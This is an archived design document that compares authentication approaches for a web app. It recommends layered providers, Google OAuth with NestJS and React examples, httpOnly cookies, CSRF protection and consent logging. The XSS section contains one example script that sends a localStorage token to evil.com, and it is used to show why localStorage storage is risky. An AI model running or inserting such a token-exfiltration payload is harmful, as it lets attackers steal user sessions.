# Authentication System Analysis & Recommendations

> **ARCHIVED:** 2026-03-26 — This analysis document has been archived for historical reference.  
> **Current Documentation:** See [auth-plan/README.md](../../planning/plans/core/auth-plan/README.md) for the authoritative auth documentation.  
> **Visualizer:** Interactive diagrams available at [tools/auth-visualizer/](../../../tools/auth-visualizer/) — run with `npm run dev`.  
> **Context:** This comparative analysis was created during Phase 1 architecture planning to evaluate three authentication approaches and recommend the @expanse two-layer system with OAuth and secure cookies.

Comprehensive comparison of current implementation, planned architecture, and documented @expanse system.

---

## Executive Summary

**Recommendation:** Implement the **@expanse two-layer architecture** with **OAuth** and **secure cookies**.

**Why:**
- ✅ Most secure (httpOnly + secure cookie flags, XSS + MITM protection)
- ✅ Most modular (clean separation of concerns)
- ✅ Most scalable (OAuth ready, guest mode, role-based access)
- ✅ Best developer experience (reusable @expanse packages)
- ✅ **OAuth is required** (Google for Phase 2, not optional)
- ✅ **Consent tracking is required** (GDPR/CCPA compliance)

---

## System Comparison

### **1. Current Implementation** (apps/4eye-web/lib/auth/)

**Architecture:**
```typescript
AuthProvider (single context)
├── useState for user/token
├── Apollo mutations (login, signup, logout)
├── localStorage for token storage
└── ME_QUERY for user data
```

**Strengths:**
- ✅ Simple, working implementation
- ✅ Token expiration checking
- ✅ Apollo Client integration
- ✅ Basic role checking (useHasRole)

**Weaknesses:**
- ❌ **Security:** localStorage vulnerable to XSS attacks (tokens readable by JavaScript)
- ❌ **Modularity:** All logic in one provider (300+ lines)
- ❌ **Missing OAuth:** Google authentication required for Phase 2
- ❌ **Missing Consent Tracking:** GDPR/CCPA compliance required
- ❌ **No Guest Mode:** Required for join-by-link feature
- ❌ **Token Management:** No refresh tokens, no secure cookie strategy

**Security Score:** 6/10

---

### **2. Planning Document** (docs/planning/plans/core/authentication.md)

**Architecture:**
```typescript
AuthProvider (React Context)
├── httpOnly cookies for JWT
├── Guest tokens (UUID + name + room)
├── Role-based access (User.role + OrganizationUser.role)
├── Consent logging (ToS/PP with IP tracking)
└── Password reset flow
```

**Strengths:**
- ✅ **Security:** Secure cookies with httpOnly + secure flags (XSS + MITM protection)
- ✅ **Guest Mode:** Full spec with guest tokens (required feature)
- ✅ **Consent Tracking:** Legal compliance (GDPR-ready, **required**)
- ✅ **Organization Roles:** HOST/ADMIN/MEMBER per org
- ✅ **OAuth:** Google authentication (**required** for Phase 2, Apple future)
- ✅ **Password Reset:** Complete flow

**Weaknesses:**
- ⚠️ **Modularity:** Still single provider (could be split)
- ⚠️ **OAuth:** Not yet specified in detail
- ⚠️ **Refresh Tokens:** Not mentioned

**Security Score:** 8/10

---

### **3. Documented @expanse System** (docs/technical/AUTHENTICATION.md)

**Architecture:**
```typescript
ApplicationProvider
└── AuthSessionProvider (JWT management)
    └── UserProvider (user data)
        └── AuthProvider (combined auth logic)
            └── App
```

**Three Layers:**
1. **AuthSession** - Token storage, validation, logout
2. **User** - User data fetching, profile management
3. **Auth** - Combined logic, guards, guest mode

**Strengths:**
- ✅ **Modularity:** Clean separation of concerns (3 layers)
- ✅ **Security:** Supports secure cookies (httpOnly + secure flags) + localStorage fallback
- ✅ **Reusable:** @expanse packages work across any app
- ✅ **Guards:** RequireAuth, RequireGuest, RequireRole
- ✅ **Guest Mode:** Built-in support
- ✅ **Testing:** Easy to test each layer independently
- ✅ **Scalability:** Easy to extend (OAuth ready, MFA future)

**Extends to:**
- ✅ **OAuth:** Google authentication (documented below)
- ✅ **Consent Tracking:** GDPR compliance (documented below)

**Security Score:** 9/10

---

## Feature Matrix

| Feature | Current | Planning Doc | @expanse System |
|---------|---------|-------------|-----------------|
| **Token Storage** | localStorage | Secure cookies (httpOnly + secure) | Both supported |
| **JWT Management** | Basic | Advanced | Advanced |
| **Guest Mode** | ❌ | ✅ | ✅ |
| **OAuth (Social Auth)** | ❌ | **Required Phase 2** | ✅ Google (documented) |
| **Role-Based Access** | Basic (useHasRole) | Full (2-tier roles) | Full (RequireRole guard) |
| **Organization Roles** | ❌ | ✅ | Can add |
| **Auth Guards** | ❌ | Basic | Advanced (3 types) |
| **Consent Tracking** | ❌ | ✅ **Required** | ✅ (documented) |
| **Password Reset** | ❌ | ✅ | Can add |
| **Refresh Tokens** | ❌ | ❌ | Can add |
| **Modularity** | Low | Medium | High |
| **Reusability** | App-specific | App-specific | Cross-app (@expanse) |
| **Testing** | Hard | Medium | Easy |

---

## Security Analysis

### **XSS Protection**

**Current (localStorage):**
- ❌ **Vulnerable:** XSS attacks can steal tokens via JavaScript
- Attack vector: `<script>fetch('evil.com?token=' + localStorage.getItem('token'))</script>`

**Planning Doc (Secure Cookies):**
- ✅ **Protected:** `httpOnly` flag prevents JavaScript access to cookies
- ✅ **Protected:** `secure` flag ensures cookies only sent over HTTPS
- XSS cannot read tokens, MITM cannot intercept over unencrypted connections

**@expanse System:**
- ✅ **Protected:** Supports secure cookies (httpOnly + secure flags)
- ✅ **Development Mode:** Can fallback to localStorage for local dev

### **CSRF Protection**

**Secure cookies require CSRF protection:**

```typescript
// Backend: apps/api/src/main.ts
import * as cookieParser from 'cookie-parser';
import * as csurf from 'csurf';

app.use(cookieParser());
app.use(csurf({ cookie: true }));
```

**@expanse recommendation:** Use `SameSite=Strict` cookies + CSRF tokens

### **Token Expiration**

**Current:**
- ✅ Client-side expiration check (with 30s buffer)
- ❌ No refresh token

**Recommended:**
- ✅ Short-lived access token (15 min)
- ✅ Long-lived refresh token (30 days)
- ✅ Refresh token rotation

---

## OAuth / Social Authentication

### **Why OAuth is Required**

**Business Requirements:**
- ✅ **Phase 2 Requirement:** Google OAuth is required (not optional)
- ✅ **Conversion:** Lower friction signup increases conversion rates
- ✅ **Trust:** "Sign in with Google" reduces signup anxiety
- ✅ **User Expectations:** Education/professional users expect social auth

**Benefits:**
1. **Friction Reduction:** No password to remember = higher signup completion
2. **Trust Factor:** Google verification provides credibility
3. **Data Quality:** Verified emails, real names, profile photos
4. **Faster Onboarding:** Pre-filled profile data from Google

**Vertical Expectations:**
- Education → Google (dominant in schools/universities)
- Professional → Google, Microsoft (future), LinkedIn (future)
- Consumer → Google, Apple (iOS requirement if native app)

### **OAuth Providers to Support**

**Phase 2 (Required):**
- ✅ **Google OAuth** — **Required**, universal, trusted, easy integration
- ✅ **Email/Password** — Always provide fallback option

**Phase 3 (Future):**
- ⚠️ **Apple** — Required if launching iOS native app
- ⚠️ **Microsoft** — Enterprise/corporate vertical
- ⚠️ **LinkedIn** — Professional networking vertical

**Phase 4 (Optional):**
- 🔮 **Facebook** — Consider privacy implications
- 🔮 **GitHub** — Developer/technical vertical

### **OAuth Implementation Architecture**

**Backend (NestJS):**

```typescript
// apps/api/src/modules/auth/auth.module.ts

import { Module } from '@nestjs/common';
import { PassportModule } from '@nestjs/passport';
import { JwtModule } from '@nestjs/jwt';
import { AuthService } from './auth.service';
import { AuthResolver } from './auth.resolver';
import { JwtStrategy } from './strategies/jwt.strategy';
import { GoogleStrategy } from './strategies/google.strategy';

@Module({
  imports: [
    PassportModule.register({ defaultStrategy: 'jwt' }),
    JwtModule.register({
      secret: process.env.JWT_SECRET,
      signOptions: { expiresIn: '15m' },
    }),
  ],
  providers: [
    AuthService,
    AuthResolver,
    JwtStrategy,
    GoogleStrategy, // Add OAuth strategies
  ],
})
export class AuthModule {}
```

**Google Strategy:**

```typescript
// apps/api/src/modules/auth/strategies/google.strategy.ts

import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { Strategy, VerifyCallback } from 'passport-google-oauth20';
import { AuthService } from '../auth.service';

@Injectable()
export class GoogleStrategy extends PassportStrategy(Strategy, 'google') {
  constructor(private authService: AuthService) {
    super({
      clientID: process.env.GOOGLE_CLIENT_ID,
      clientSecret: process.env.GOOGLE_CLIENT_SECRET,
      callbackURL: process.env.GOOGLE_CALLBACK_URL,
      scope: ['email', 'profile'],
    });
  }

  async validate(
    accessToken: string,
    refreshToken: string,
    profile: any,
    done: VerifyCallback,
  ): Promise<any> {
    const { id, emails, displayName, photos } = profile;
    
    // Find or create user
    const user = await this.authService.findOrCreateOAuthUser({
      provider: 'google',
      providerId: id,
      email: emails[0].value,
      name: displayName,
      avatarUrl: photos[0]?.value,
    });

    done(null, user);
  }
}
```

**Auth Routes:**

```typescript
// apps/api/src/modules/auth/auth.controller.ts (REST for OAuth)

import { Controller, Get, Req, Res, UseGuards } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';

@Controller('auth')
export class AuthController {
  constructor(private authService: AuthService) {}

  @Get('google')
  @UseGuards(AuthGuard('google'))
  googleAuth() {
    // Initiates OAuth flow
  }

  @Get('google/callback')
  @UseGuards(AuthGuard('google'))
  async googleAuthCallback(@Req() req, @Res() res) {
    // Generate JWT
    const { accessToken, refreshToken } = await this.authService.login(req.user);
    
    // Set secure cookies with httpOnly + secure flags
    res.cookie('accessToken', accessToken, {
      httpOnly: true,  // XSS protection: JavaScript cannot read
      secure: process.env.NODE_ENV === 'production',  // HTTPS only
      sameSite: 'strict',  // CSRF protection
      maxAge: 15 * 60 * 1000, // 15 min
    });
    
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,  // XSS protection
      secure: process.env.NODE_ENV === 'production',  // HTTPS only
      sameSite: 'strict',  // CSRF protection
      maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
    });

    // Redirect to app
    res.redirect(process.env.FRONTEND_URL + '/dashboard');
  }
}
```

**Frontend (@expanse/auth):**

```typescript
// packages/@expanse/auth/src/components/GoogleLoginButton.tsx

export function GoogleLoginButton() {
  const handleGoogleLogin = () => {
    // Redirect to backend OAuth endpoint
    window.location.href = `${process.env.NEXT_PUBLIC_API_URL}/auth/google`;
  };

  return (
    <Button
      variant="outlined"
      startIcon={<GoogleIcon />}
      onClick={handleGoogleLogin}
      fullWidth
    >
      Continue with Google
    </Button>
  );
}
```

**Data Model (OAuth Users):**

```typescript
// apps/api/src/modules/users/entities/user.entity.ts

@Entity()
export class User {
  @PrimaryGeneratedColumn('uuid')
  id: string;

  @Column({ unique: true })
  email: string;

  @Column({ nullable: true })
  passwordHash: string; // Nullable for OAuth users

  @Column()
  name: string;

  @Column({ nullable: true })
  avatarUrl: string;

  @Column({ type: 'enum', enum: UserRole, default: UserRole.MEMBER })
  role: UserRole;

  // OAuth fields
  @Column({ nullable: true })
  oauthProvider: string; // 'google', 'apple', null for email/password

  @Column({ nullable: true })
  oauthProviderId: string; // Provider's user ID

  @Column({ default: false })
  emailVerified: boolean; // Auto-true for OAuth

  @CreateDateColumn()
  createdAt: Date;

  @UpdateDateColumn()
  updatedAt: Date;
}
```

---

## Recommended Architecture

### **Combine Best of All Three Systems**

```typescript
// Final Architecture

ApplicationProvider
└── AuthSessionProvider (@expanse/auth)
    ├── JWT management (secure cookies: httpOnly + secure + sameSite)
    ├── Token refresh logic (with rotation)
    ├── Token expiration checking
    └── Logout (clear cookies + invalidate server-side)
    
    └── UserProvider (@expanse/user)
        ├── User data fetching (ME_QUERY)
        ├── Profile management
        └── User update mutations
        
        └── AuthProvider (@expanse/auth)
            ├── Login (email/password + OAuth)
            ├── Signup (email/password with consent)
            ├── Guest mode (guest tokens)
            ├── Role checking (user role + org roles)
            └── Consent tracking
            
            └── Guards
                ├── RequireAuth (redirect to login)
                ├── RequireGuest (redirect to dashboard)
                ├── RequireRole (system + org roles)
                └── RequireConsent (ToS/PP acceptance)
```

### **Package Structure**

**@expanse/auth** — Core authentication:
- AuthSessionProvider (JWT with secure cookies: httpOnly + secure + sameSite)
- AuthProvider (login, signup, logout, guest mode)
- Auth guards (RequireAuth, RequireGuest, RequireRole, RequireConsent)
- Auth components (LoginForm, SignupForm, AuthModal, GoogleLoginButton)
- **OAuth integration (Google required, Apple/Microsoft future)**
- **Consent tracking (GDPR/CCPA compliant, required)**

**@expanse/user** — User data management:
- UserProvider (user data, profile)
- User hooks (useUser, useUserProfile)
- Profile components (ProfileMenu, UserAvatar)

**@4eye/types** — Type definitions:
- User, UserRole
- AuthState, AuthContextType
- ConsentLog, ConsentType
- OAuthProvider enum

---

## Migration Strategy

### **Phase 1: Keep Current, Plan for @expanse**
- ✅ Current system works, don't break it
- ✅ Complete Phase 1 (architecture foundation docs) ← **WE ARE HERE**
- Document OAuth requirements (this file)

### **Phase 2: Extract to @expanse Packages**
1. Create @expanse/auth package with two-layer architecture
2. Migrate current auth logic to @expanse
3. **Implement OAuth (Google required)**
4. **Implement consent tracking (GDPR required)**
5. Implement auth guards (RequireAuth, RequireGuest, RequireRole)
6. Implement refresh token rotation
7. Switch to secure cookies (httpOnly + secure + sameSite flags)

### **Phase 3: Enhance with Advanced Features**
- Guest mode full implementation
- Organization roles (HOST/ADMIN/MEMBER)
- Password reset flow
- Email verification
- MFA (future)

---

## Implementation Priority

### **Must Have (Phase 2 - Required)**
1. ✅ Email/password auth with secure cookies (httpOnly + secure + sameSite)
2. ✅ Guest mode (name + guest token, 24-hour expiry)
3. ✅ **Google OAuth (required - not optional)**
4. ✅ **Consent tracking (GDPR/CCPA required)**
5. ✅ RequireAuth + RequireGuest guards
6. ✅ Role-based access (User.role system-wide)

### **Should Have (Post-MVP)**
1. ⚠️ Organization roles (OrganizationUser.role)
2. ⚠️ Password reset flow
3. ⚠️ Refresh token rotation
4. ⚠️ Email verification
5. ⚠️ RequireRole guard (org-level)

### **Nice to Have (Phase 3)**
1. 🔮 Apple OAuth (if building native iOS app)
2. 🔮 Microsoft OAuth (enterprise vertical)
3. 🔮 Token revocation/blacklist
4. 🔮 MFA (2FA via authenticator app)
5. 🔮 Session management (view/revoke active sessions)

---

## Security Best Practices

### **Token Management**
```typescript
// Recommended token lifetimes
accessToken: 15 minutes   // Short-lived, in secure cookie (httpOnly + secure)
refreshToken: 30 days     // Long-lived, in secure cookie (httpOnly + secure)
guestToken: 24 hours      // Guest session expires after 1 day
```

### **Cookie Configuration**
```typescript
res.cookie('accessToken', token, {
  httpOnly: true,           // XSS protection: JavaScript cannot access
  secure: true,             // HTTPS only: Server requires SSL/TLS
  sameSite: 'strict',       // CSRF protection: No cross-site requests
  maxAge: 15 * 60 * 1000,   // 15 minutes
});
```

### **CSRF Protection**
- Use `csurf` middleware or `SameSite=Strict` cookies
- Include CSRF token in form submissions

### **Rate Limiting**
```typescript
// Prevent brute force attacks
app.use('/auth/login', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: 'Too many login attempts, please try again later',
}));
```

### **Password Requirements**
- Minimum 8 characters
- At least one uppercase, lowercase, number
- Use `bcrypt` with salt rounds ≥ 10

---

## Consent & Legal Compliance

### **GDPR Requirements**
- ✅ Log consent with IP, user agent, timestamp
- ✅ Track document versions (ToS v1.0, PP v1.1)
- ✅ Re-prompt on document updates
- ✅ Allow users to view/export consent history

### **Consent Log Schema**
```typescript
interface ConsentLog {
  id: string;
  userId: string;
  type: 'TOS' | 'PRIVACY_POLICY';
  version: string;          // e.g., "2026-03-26"
  acceptedAt: Date;
  ipAddress: string;
  userAgent: string;
  locale: string;
}
```

---

## Testing Strategy

### **Unit Tests (Each Layer)**
```typescript
// @expanse/auth/__tests__/unit/
- AuthSessionProvider.test.tsx   // Token management
- UserProvider.test.tsx           // User data fetching
- AuthProvider.test.tsx           // Login/signup/logout
- RequireAuth.test.tsx            // Guard behavior
```

### **Integration Tests**
```typescript
// apps/4eye-web/__tests__/integration/
- auth-flow.test.tsx              // Full login → dashboard flow
- oauth-flow.test.tsx             // Google OAuth flow
- guest-flow.test.tsx             // Guest join → prompt signup
```

### **E2E Tests**
```typescript
// e2e/auth.spec.ts (Playwright)
- Login with email/password
- Login with Google
- Guest join session
- Role-based access (member vs admin)
- Consent acceptance
```

---

## Related Documentation

- **[AUTHENTICATION.md](AUTHENTICATION.md)** — @expanse auth architecture (this is the base)
- **[docs/planning/plans/core/authentication.md](../../planning/plans/core/authentication.md)** — Original planning doc
- **[PACKAGE_ARCHITECTURE.md](PACKAGE_ARCHITECTURE.md)** — Package organization
- **[MIGRATION_GUIDE.md](../planning/MIGRATION_GUIDE.md)** — Migration steps

---

## Decision

**Recommendation:** Implement **@expanse two-layer architecture** with:
1. ✅ Secure cookies (httpOnly + secure + sameSite flags)
2. ✅ **Google OAuth (required Phase 2)**
3. ✅ **Consent tracking (GDPR required)**
4. ✅ Guest mode (24-hour tokens)
5. ✅ Refresh token rotation

**Rationale:**
- Most secure (httpOnly + secure cookies protect against XSS + MITM)
- Most modular (@expanse packages reusable across apps)
- OAuth is required (not optional - business requirement)
- Consent tracking is required (legal compliance)
- Guest mode is required (virality feature)
- Aligns with all planning requirements
- Easy to test and extend

**Next Steps:**
1. Update AUTHENTICATION.md with OAuth section
2. Add OAuth strategy to Phase 2 migration plan
3. Proceed with Phase 1.2 (create package structure)
